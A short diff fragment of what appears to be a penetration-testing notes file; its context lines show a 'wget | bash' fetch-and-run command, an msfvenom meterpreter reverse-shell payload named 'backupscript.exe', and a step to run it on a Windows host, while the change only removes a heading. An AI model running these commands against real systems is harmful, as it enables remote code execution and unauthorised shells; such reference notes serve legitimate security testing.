@@ -641,6 +641,3 @@ wget -q0- <Target File URL> | bash
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Internal_Target_IP> -f exe -o backupscript.exe LPORT=1234
   ```
   4. Execute the payload on the windows host.
-  
-
-## Testing the Top 10 Web Application Vulnerabilities
